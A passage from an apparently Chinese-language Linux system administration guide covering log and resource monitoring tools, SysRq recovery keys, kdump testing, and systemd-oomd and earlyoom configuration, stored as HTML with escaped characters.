<li>\u200b\u7cfb\u7edf\u65e5\u5fd7\u200b<ul> <li><code>journalctl -f</code></li> <li><code>dmesg -w</code></li> <li>\u200b\u68c0\u67e5\u200b\u786c\u4ef6\u200b\u662f\u5426\u200b\u53d1\u751f\u200b\u9519\u8bef\u200b\uff1a<code>ras-mc-ctl --summary</code>\uff0c\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u5b89\u88c5\u200b <code>rasdaemon</code> \u200b\u5305\u200b\u3002</li> </ul> </li> <li>\u200b\u8d44\u6e90\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b<ul> <li><code>df -h</code> \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\u3002</li> <li><code>iotop</code> \u200b\u53ef\u4ee5\u200b\u6309\u200b\u8fdb\u7a0b\u200b\u67e5\u770b\u200b\u78c1\u76d8\u200b I/O \u200b\u60c5\u51b5\u200b\u3002<ul> <li>iotop \u200b\u6709\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u5728\u200b\u5404\u4e2a\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\u4e00\u822c\u200b\u5206\u4e3a\u200b <code>iotop</code> \u200b\u548c\u200b <code>iotop-c</code>\u3002\u200b\u524d\u8005\u200b\u5df2\u7ecf\u200b\u505c\u6b62\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u63a8\u8350\u200b\u5b89\u88c5\u200b <code>iotop-c</code>\u3002</li> </ul> </li> <li><code>iftop</code> \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u5bf9\u5e94\u200b\u63a5\u53e3\u200b\u5230\u200b\u6bcf\u4e2a\u200b\u8fdc\u7aef\u200b IP \u200b\u7684\u200b\u7f51\u7edc\u6d41\u91cf\u200b\u60c5\u51b5\u200b\u3002<ul> <li>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u6309\u200b\u8fdb\u7a0b\u200b\u67e5\u770b\u200b\u7f51\u7edc\u6d41\u91cf\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>nethogs</code>\u3002</li> <li>\u200b\u5982\u679c\u200b\u53ea\u200b\u9700\u8981\u200b\u63a5\u53e3\u200b\u7684\u200b\u603b\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>bmon</code>\u3002</li> </ul> </li> </ul> </li> </ul> <p>\u200b\u7cfb\u7edf\u200b\u51e0\u4e4e\u200b/\u200b\u5b8c\u5168\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b</p> <p>\u200b\u4e0d\u5e78\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4f1a\u5361\u200b\u5728\u200b\u90a3\u91cc\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u662f\u56e0\u4e3a\u200b\u5185\u5b58\u200b\u51e0\u4e4e\u200b\u5df2\u6ee1\u200b\uff08OOM\uff09\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5927\u91cf\u200b I/O \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u53ef\u80fd\u200b\u662f\u200b\u5185\u6838\u200b\u5d29\u6e83\u200b\u6216\u662f\u200b\u786c\u4ef6\u200b\u95ee\u9898\u200b\u3002\u200b\u5982\u679c\u200b\u5185\u6838\u200b\u4ecd\u7136\u200b\u5728\u200b\u8fd0\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u4f7f\u7528\u200b SysRq \u200b\u5feb\u6377\u952e\u200b\u505a\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5982\u679c\u200b\u673a\u5668\u200b\u6ca1\u6709\u200b SysRq \u200b\u6309\u952e\u200b\uff08\u200b\u4f8b\u5982\u200b\u7b14\u8bb0\u672c\u7535\u8111\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b PrintScreen \u200b\u952e\u200b\u4ee3\u66ff\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b\u53d1\u884c\u7248\u200b\u914d\u7f6e\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u4ec5\u200b\u5141\u8bb8\u200b\u6709\u9650\u200b\u7684\u200b SysRq \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5411\u200b <code>/proc/sys/kernel/sysrq</code> \u200b\u5199\u5165\u200b 1 \u200b\u6765\u200b\u8fd0\u884c\u200b\u5168\u90e8\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6216\u8005\u200b\u81ea\u884c\u200b\u8ba1\u7b97\u200b\u5141\u8bb8\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u8be6\u60c5\u200b\u89c1\u200b Linux \u200b\u5185\u6838\u200b\u6587\u6863\u200b\u7684\u200b\u300cLinux Magic System Request Key Hacks\u300d\u200b\u90e8\u5206\u200b\u3002\u200b\u9700\u8981\u200b\u5728\u200b sysctl \u200b\u914d\u7f6e\u200b\u4e2d\u200b\u8bbe\u7f6e\u200b <code>kernel.sysrq=1</code> \u200b\u4ee5\u200b\u6301\u4e45\u200b\u5316\u200b\u76f8\u5e94\u200b\u8bbe\u7f6e\u200b\u3002</p> <p>\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b SysRq \u200b\u7cfb\u5217\u200b\u6307\u4ee4\u200b\u4e3a\u200b REISUB\uff08\u200b\u5373\u200b busy \u200b\u7684\u200b\u6bd4\u8f83\u7ea7\u200b busier \u200b\u53cd\u8fc7\u6765\u200b\uff09\uff0c\u200b\u5373\u200b\u6309\u200b\u987a\u5e8f\u200b\u6309\u4e0b\u200b Alt+SysRq+R\u3001E\u3001I\u3001S\u3001U\u3001B\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e3a\u200b\uff1a</p> <ul> <li>(un)R(aw)\uff1a\u200b\u4fee\u6539\u200b\u952e\u76d8\u200b\u6a21\u5f0f\u200b\u5230\u200b ASCII\uff08XLATE\uff09\uff0c\u200b\u4e00\u822c\u200b\u7528\u4e8e\u200b\u4ece\u200b X \u200b\u684c\u9762\u73af\u5883\u200b\u593a\u53d6\u200b\u952e\u76d8\u200b\u63a7\u5236\u200b\u3002</li> <li>t(E)rm\uff1a\u200b\u53d1\u9001\u200b SIGTERM \u200b\u4fe1\u53f7\u200b\u7ed9\u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\u3002</li> <li>k(I)ll\uff1a\u200b\u53d1\u9001\u200b SIGKILL \u200b\u4fe1\u53f7\u200b\u7ed9\u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\u3002</li> <li>(S)ync\uff1a\u200b\u5c06\u200b\u6240\u6709\u200b\u5df2\u200b\u6302\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u78c1\u76d8\u200b\u3002</li> <li>(U)nmount\uff1a\u200b\u91cd\u65b0\u200b\u6302\u8f7d\u200b\u6240\u6709\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e3a\u200b\u53ea\u8bfb\u200b\u6a21\u5f0f\u200b\u3002</li> <li>re(B)oot\uff1a\u200b\u91cd\u542f\u200b\u7cfb\u7edf\u200b\u3002</li> </ul> <p>\u200b\u5982\u679c\u200b\u786e\u4fe1\u200b\u95ee\u9898\u200b\u662f\u200b\u7531\u4e8e\u200b\u67d0\u4e9b\u200b\u8fdb\u7a0b\u200b\u5360\u7528\u200b\u5927\u91cf\u200b\u5185\u5b58\u200b\u5bfc\u81f4\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Alt+SysRq+F \u200b\u6765\u200b\u89e6\u53d1\u200b\u5185\u6838\u200b\u7684\u200b OOM Killer\u3002</p> <p>\u200b\u53e6\u5916\u200b\uff0c\u200b\u5411\u200b <code>/proc/sysrq-trigger</code> \u200b\u5199\u5165\u200b\u5b57\u7b26\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u89e6\u53d1\u200b\u5bf9\u5e94\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5176\u4ed6\u200b\u5185\u5bb9\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u4ee5\u4e0a\u200b\u5185\u6838\u200b\u6587\u6863\u200b\u94fe\u63a5\u200b\u3002</p> <p>\u200b\u6d4b\u8bd5\u200b kdump</p> <p>Debian \u200b\u7684\u200b <code>kdump-tools</code> \u200b\u5305\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u914d\u7f6e\u200b\u5728\u200b\u5185\u6838\u200b\u5d29\u6e83\u200b\uff08kernel panic\uff09\u200b\u65f6\u200b\u81ea\u52a8\u200b\u8fdb\u5165\u200b kdump \u200b\u7684\u200b\u5907\u7528\u200b\u5185\u6838\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u786c\u76d8\u200b\u4e0a\u200b\u5b58\u50a8\u200b\u5185\u6838\u200b\u7684\u200b coredump \u200b\u7b49\u200b\u8c03\u8bd5\u4fe1\u606f\u200b\u3002\u200b\u5c1d\u8bd5\u200b\u5728\u200b\u6d4b\u8bd5\u73af\u5883\u200b\u5b89\u88c5\u200b <code>kdump-tools</code>\uff0c\u200b\u5e76\u200b\u4f7f\u7528\u200b SysRq \u200b\u89e6\u53d1\u200b\u5185\u6838\u200b\u5d29\u6e83\u200b\uff0c\u200b\u9a8c\u8bc1\u200b\u914d\u7f6e\u200b\u7684\u200b\u6709\u6548\u6027\u200b\u3002</p> <p>\u200b\u7528\u6237\u200b\u6001\u200b OOM Killer</p> <p>Linux kernel \u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b OOM Killer \u200b\u673a\u5236\u200b\uff0c\u200b\u5f53\u200b\u5185\u5b58\u4e0d\u8db3\u200b\u65f6\u200b\uff0cOOM Killer \u200b\u4f1a\u200b\u7ed9\u200b\u7a0b\u5e8f\u200b\u6253\u5206\u200b\uff0c\u200b\u9009\u62e9\u200b\u5206\u6570\u200b\u6700\u9ad8\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u6740\u6b7b\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5728\u200b OOM Killer \u200b\u4ecb\u5165\u200b\u4e4b\u524d\u200b\uff0c\u200b\u5185\u6838\u200b\u4f1a\u200b\u5c3d\u53ef\u80fd\u200b\u5c1d\u8bd5\u200b\u901a\u8fc7\u200b\u56de\u6536\u200b\u7f13\u5b58\u200b\u7b49\u200b\u65b9\u5f0f\u200b\u6ee1\u8db3\u200b\u5185\u5b58\u200b\u9700\u6c42\u200b\uff0c\u200b\u800c\u200b\u5982\u679c\u200b\u7f13\u5b58\u6570\u636e\u200b\u662f\u200b\u975e\u5e38\u200b\u9891\u7e41\u200b\u4f7f\u7528\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f1a\u200b\u9891\u7e41\u200b\u51fa\u73b0\u200b\u5728\u200b\u56de\u6536\u200b\u7f13\u5b58\u200b\u4e4b\u540e\u200b\u53c8\u200b\u8bfb\u53d6\u200b\u56de\u6765\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f1a\u200b\u6781\u5927\u200b\u5730\u200b\u5360\u7528\u200b IO \u200b\u8d44\u6e90\u200b\uff0c\u200b\u5bfc\u81f4\u7cfb\u7edf\u200b\u53d8\u5f97\u200b\u51e0\u4e4e\u200b\u4e0d\u53ef\u200b\u7528\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u7531\u4e8e\u200b\u56de\u6536\u200b\u64cd\u4f5c\u200b\u786e\u5b9e\u200b\u91ca\u653e\u200b\u4e86\u200b\u5185\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b OOM Killer \u200b\u4e0d\u4f1a\u200b\u4ecb\u5165\u200b\u3002</p> <p>\u200b\u7528\u6237\u200b\u6001\u200b OOM Killer \u200b\u53ef\u4ee5\u200b\u5f88\u5927\u200b\u7a0b\u5ea6\u200b\u7f13\u89e3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li> <p>systemd-oomd\u3002\u200b\u5728\u200b\u6700\u8fd1\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\u4e00\u822c\u200b\u9884\u88c5\u200b\u3002\u200b\u5b83\u200b\u4ee5\u200b cgroup \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u6839\u636e\u200b\u5185\u5b58\u200b\u7684\u200b PSI \u200b\u4fe1\u606f\u200b\u4e0e\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u548c\u200b swap \u200b\u5360\u7528\u200b\u6bd4\u4f8b\u200b\u5224\u65ad\u200b\uff0c\u200b\u5982\u679c\u200b PSI \u200b\u5728\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u8d85\u8fc7\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u9608\u503c\u200b\uff0c\u200b\u6216\u8005\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u548c\u200b swap \u200b\u7684\u200b\u5360\u7528\u200b\u6bd4\u4f8b\u200b\u90fd\u200b\u8d85\u8fc7\u200b\u9608\u503c\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5c06\u200b\u5bf9\u5e94\u200b\u7684\u200b cgroup \u200b\u6740\u6b7b\u200b\u3002\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b oomd\uff0c\u200b\u5efa\u8bae\u200b\u5f00\u542f\u200b swap\uff0c\u200b\u4ee5\u4fbf\u200b\u4e3a\u200b oomd \u200b\u63d0\u4f9b\u200b\u8db3\u591f\u200b\u7684\u200b\u54cd\u5e94\u200b\u65f6\u95f4\u200b\u5904\u7406\u200b\u3002</p> <p>\u200b\u7531\u4e8e\u200b oomd \u200b\u5904\u7406\u200b\u4ee5\u200b cgroup \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u684c\u9762\u73af\u5883\u200b\u4e0b\u200b\u9700\u8981\u200b\u786e\u5b9a\u200b\u684c\u9762\u73af\u5883\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u5c06\u200b\u6bcf\u4e2a\u200b\u5e94\u7528\u200b\u653e\u5728\u200b\u72ec\u7acb\u200b\u7684\u200b cgroup \u200b\u4e2d\u200b\uff08GNOME\u3001KDE \u200b\u7b49\u200b\u73b0\u4ee3\u200b\u684c\u9762\u73af\u5883\u200b\u662f\u200b\u6ca1\u6709\u200b\u95ee\u9898\u200b\u7684\u200b\uff09\uff1b\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u6709\u200b\u4f7f\u7528\u200b tmux \u200b\u7b49\u200b\u5de5\u5177\u200b\u7684\u200b\u4e60\u60ef\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b\u8ba9\u200b\u5b83\u4eec\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u7a97\u53e3\u200b\u90fd\u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b cgroup \u200b\u4e2d\u200b\uff08\u200b\u4f8b\u5982\u200b\u914d\u7f6e\u200b tmux \u200b\u7684\u200b <code>default-command</code> \u200b\u4e3a\u200b <code>systemd-run --user --scope bash</code>\uff09\uff0c\u200b\u5426\u5219\u200b\u5728\u200b\u8fd0\u884c\u200b\u4e86\u200b\u8fc7\u5206\u200b\u5360\u7528\u200b\u5185\u5b58\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u540e\u200b\uff0coomd \u200b\u4f1a\u200b\u5c06\u200b\u6574\u4e2a\u200b tmux cgroup \u200b\u6740\u6b7b\u200b\u3002</p> <p>oomd \u200b\u662f\u200b opt-in \u200b\u7684\u200b\u2014\u2014\u200b\u9700\u8981\u200b\u4e3b\u52a8\u200b\u5728\u200b systemd \u200b\u76f8\u5173\u200b unit \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u76f8\u5173\u200b\u914d\u7f6e\u200b\uff0coomd \u200b\u624d\u200b\u4f1a\u200b\u5904\u7406\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>oomctl</code> \u200b\u547d\u4ee4\u200b\u83b7\u53d6\u200b\u5f53\u524d\u200b oomd \u200b\u72b6\u6001\u200b\uff0c\u200b\u68c0\u67e5\u200b \"Swap Monitored CGroups\" \u200b\u4e0e\u200b \"Memory Pressure Monitored CGroups\" \u200b\u662f\u5426\u200b\u5305\u542b\u200b\u9700\u8981\u200b\u76d1\u63a7\u200b\u7684\u200b systemd unit\u3002\u200b\u8bf8\u5982\u200b Debian\u3001Fedora \u200b\u7b49\u200b\u53d1\u884c\u7248\u200b\u5747\u200b\u505a\u200b\u4e86\u200b\u76f8\u5173\u200b\u7684\u200b\u9884\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u5728\u200b unit \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u914d\u7f6e\u200b <code>ManagedOOMSwap</code> \u200b\u548c\u200b <code>ManagedOOMMemoryPressure</code> \u200b\u5916\u200b\uff0c\u200b\u5efa\u8bae\u200b\u901a\u8fc7\u200b\u7f16\u8f91\u200b <code>/etc/systemd/oomd.conf</code> \u200b\u6587\u4ef6\u200b\u6765\u200b\u8c03\u6574\u200b oomd \u200b\u7684\u200b\u5168\u5c40\u200b\u884c\u4e3a\u200b\u3002\u200b\u5176\u4e2d\u200b <code>SwapUsedLimit</code> \u200b\u53c2\u6570\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 90%\uff09\u200b\u867d\u7136\u200b\u540d\u79f0\u200b\u4e2d\u200b\u5305\u542b\u200b \"Swap\"\uff0c\u200b\u4f46\u200b\u5b83\u200b\u540c\u65f6\u200b\u9002\u7528\u200b\u4e8e\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u548c\u200b Swap \u200b\u7a7a\u95f4\u200b\u3002oomd \u200b\u89e6\u53d1\u200b\u7684\u200b\u6761\u4ef6\u200b\u662f\u200b\uff1a\u200b\u5185\u5b58\u200b\u538b\u529b\u200b\uff08PSI\uff09\u200b\u8d85\u8fc7\u200b <code>DefaultMemoryPressureLimit</code> \u200b\u6216\u200b (\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4f7f\u7528\u7387\u200b &gt; <code>SwapUsedLimit</code> \u200b\u4e14\u200b Swap \u200b\u7a7a\u95f4\u200b\u4f7f\u7528\u7387\u200b &gt; <code>SwapUsedLimit</code>)\u3002\u200b\u5f53\u200b\u8fbe\u5230\u200b <code>SwapUsedLimit</code> \u200b\u65f6\u200b\uff0coomd \u200b\u4f1a\u200b\u6740\u6b7b\u200b\u5360\u7528\u200b swap \u200b\u6700\u9ad8\u200b\u4e14\u200b\u5360\u200b\u7528\u91cf\u200b\u8d85\u8fc7\u200b 5% swap \u200b\u7684\u200b cgroup\uff1b\u200b\u5f53\u200b\u8fbe\u5230\u200b <code>OOMMemoryPressureLimit</code> \u200b\u65f6\u200b\uff0coomd \u200b\u4f1a\u200b\u4f18\u5148\u9009\u62e9\u200b\u9700\u8981\u200b\u8ba9\u200b\u7cfb\u7edf\u200b\u56de\u6536\u200b\u6700\u200b\u591a\u200b\u5185\u5b58\u200b\uff08\u200b\u5e26\u6765\u200b\u7684\u200b\u538b\u529b\u200b\u6700\u200b\u591a\u200b\uff09\u200b\u7684\u200b cgroup\u3002</p> <p>\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u8f83\u5927\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u7684\u200b 90% <code>SwapUsedLimit</code> \u200b\u53ef\u80fd\u200b\u8fc7\u65e9\u200b\u89e6\u53d1\u200b OOM Killer\uff0c\u200b\u5f71\u54cd\u200b\u6b63\u5e38\u200b\u4f7f\u7528\u200b\u3002\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u5c06\u200b\u5176\u200b\u8c03\u6574\u200b\u81f3\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4f8b\u5982\u200b 95% \u200b\u6216\u200b 98%\uff0c\u200b\u6839\u636e\u200b\u5b9e\u9645\u200b\u7269\u7406\u200b\u5185\u5b58\u5927\u5c0f\u200b\u9884\u7559\u200b\u4e00\u90e8\u5206\u200b\u5373\u53ef\u200b\u3002\u200b\u53e6\u5916\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u70b9\u200b\u4e0d\u200b\u7b26\u5408\u200b\u9884\u671f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u8bbe\u7f6e\u200b <code>SwapUsedLimit</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u9996\u5148\u200b kill \u200b\u5360\u7528\u200b swap \u200b\u6700\u591a\u200b\u7684\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u5360\u7528\u200b\u5185\u5b58\u200b\u6700\u591a\u200b\u7684\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5360\u7528\u200b\u4e86\u200b\u6700\u200b\u591a\u200b\u7684\u200b\u5185\u5b58\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5e76\u200b\u6ca1\u6709\u200b\u88ab\u200b kill\uff0c\u200b\u800c\u662f\u200b\u5360\u7528\u200b\u6bd4\u8f83\u200b\u5c11\u200b\u5185\u5b58\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u88ab\u200b kill \u200b\u4e86\u200b\u3002</p> Debian 12 \u200b\u4e2d\u200b\u7684\u200b systemd-oomd \u200b\u914d\u7f6e\u200b <p>Debian 12 \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e3a\u200b\uff1a\u200b\u5728\u200b\u7528\u6237\u200b slice \u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u538b\u529b\u200b\u8d85\u8fc7\u200b 50%\uff0c\u200b\u5219\u200b\u6740\u6b7b\u200b\u538b\u529b\u200b\u6700\u5927\u200b\u7684\u200b cgroup\uff1b\u200b\u5982\u679c\u200b\u5168\u200b\u7cfb\u7edf\u200b swap \u200b\u4f7f\u7528\u7387\u200b\u8d85\u8fc7\u200b\u9ed8\u8ba4\u503c\u200b\uff0890%\uff09\uff0c\u200b\u5219\u200b\u6740\u6b7b\u200b\u5360\u7528\u200b\u6700\u5927\u200b\u7684\u200b cgroup\u3002</p> /usr/lib/systemd/system/-.slice.d/10-oomd-root-slice-defaults.conf<pre><code>[Slice]\nManagedOOMSwap=kill\n</code></pre> /usr/lib/systemd/system/user@.service.d/10-oomd-user-service-defaults.conf<pre><code>[Service]\nManagedOOMMemoryPressure=kill\nManagedOOMMemoryPressureLimit=50%\n</code></pre> Fedora 42 \u200b\u4e2d\u200b\u7684\u200b systemd-oomd \u200b\u914d\u7f6e\u200b <p>Fedora 42 \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e3a\u200b\uff1a\u200b\u5728\u200b\u7cfb\u7edf\u200b\u548c\u200b\u7528\u6237\u200b slice \u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u538b\u529b\u200b\u8d85\u8fc7\u200b 80%\uff0c\u200b\u5219\u200b\u6740\u6b7b\u200b\u538b\u529b\u200b\u6700\u5927\u200b\u7684\u200b cgroup\u3002</p> /usr/lib/systemd/system/system.slice.d/10-oomd-per-slice-defaults.conf<pre><code>[Slice]\nManagedOOMMemoryPressure=kill\nManagedOOMMemoryPressureLimit=80%\n</code></pre> /usr/lib/systemd/user/slice.d/10-oomd-per-slice-defaults.conf<pre><code>[Slice]\nManagedOOMMemoryPressure=kill\nManagedOOMMemoryPressureLimit=80%\n</code></pre> </li> <li> <p>earlyoom\u3002earlyoom \u200b\u4f7f\u7528\u200b mlock(2) \u200b\u6765\u200b\u4fdd\u8bc1\u200b\u5728\u200b\u5185\u5b58\u4e0d\u8db3\u200b\u65f6\u5176\u200b\u672c\u8eab\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u54cd\u5e94\u200b\u3002\u200b\u5b83\u4f1a\u200b\u5b9a\u65f6\u200b\u68c0\u67e5\u200b\u5185\u5b58\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u4e0d\u8db3\u200b\uff0c\u200b\u5219\u200b\u6740\u6b7b\u200b\u5185\u6838\u200b\u8bc4\u4f30\u200b oom \u200b\u5206\u6570\u200b\u6700\u9ad8\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u3002</p> <p>earlyoom \u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u5728\u200b\u6740\u6b7b\u200b\u8fdb\u7a0b\u200b\u540e\u200b\u6267\u884c\u547d\u4ee4\u200b\uff08\u200b\u4f8b\u5982\u200b\u63d0\u793a\u200b\u7528\u6237\u200b\u6709\u200b\u8fdb\u7a0b\u200b\u88ab\u200b\u6740\u6b7b\u200b\uff09\u3002Vlab \u200b\u9879\u76ee\u200b\u5373\u200b\u505a\u200b\u4e86\u200b\u76f8\u5173\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u901a\u8fc7\u200b\u7ed3\u5408\u200b zenity \u200b\u5f39\u200b\u51fa\u200b\u5bf9\u8bdd\u6846\u200b\uff0c\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p></p> </li> </ul> <p>tmpfs?</p> <p>\u200b\u601d\u8003\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b\u5728\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u9519\u8bef\u200b\u5730\u5411\u200b tmpfs \u200b\u5199\u5165\u200b\u4e86\u200b\u5927\u91cf\u200b\u6570\u636e\u200b\u5bfc\u81f4\u200b\u5185\u5b58\u4e0d\u8db3\u200b\uff0csystemd-oomd \u200b\u53ef\u4ee5\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u5417\u200b\uff1fearlyoom \u200b\u5462\u200b\uff1f</p> <p>\u200b\u7cfb\u7edf\u200b\u65e0\u6cd5\u200b\u542f\u52a8\u200b</p> <p>\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u5931\u8d25\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u5404\u79cd\u5404\u6837\u200b\u7684\u200b\u539f\u56e0\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4ee5\u4e0b\u200b\u53ea\u200b\u80fd\u591f\u200b\u63d0\u4f9b\u200b\u5bf9\u200b\u4e00\u90e8\u5206\u200b\u60c5\u51b5\u200b\u6709\u200b\u5e2e\u52a9\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u65e0\u6cd5\u200b\u770b\u5230\u200b GRUB \u200b\u754c\u9762\u200b\uff0c\u200b\u6216\u8005\u200b\u786e\u5b9a\u200b\u5df2\u7ecf\u200b\u65e0\u6cd5\u200b\u4ece\u200b\u786c\u76d8\u200b\u5f15\u5bfc\u200b\u5230\u200b\u53ef\u4ee5\u200b\u6536\u62fe\u6b8b\u5c40\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b LiveCD/USB \u200b\u542f\u52a8\u200b\u7cfb\u7edf\u200b\uff08\u200b\u548c\u200b\u5b89\u88c5\u200b\u7cfb\u7edf\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7c7b\u4f3c\u200b\uff09\u200b\u8fdb\u884c\u200b\u6551\u63f4\u200b\u64cd\u4f5c\u200b\u3002\u200b\u8fd9\u91cc\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b Arch Linux \u200b\u7684\u200b\u5b89\u88c5\u200b\u955c\u50cf\u200b\uff08\u200b\u53c8\u200b\u79f0\u4e3a\u200b archiso\uff09\uff0c\u200b\u56e0\u4e3a\u200b\uff1a</p> <ul> 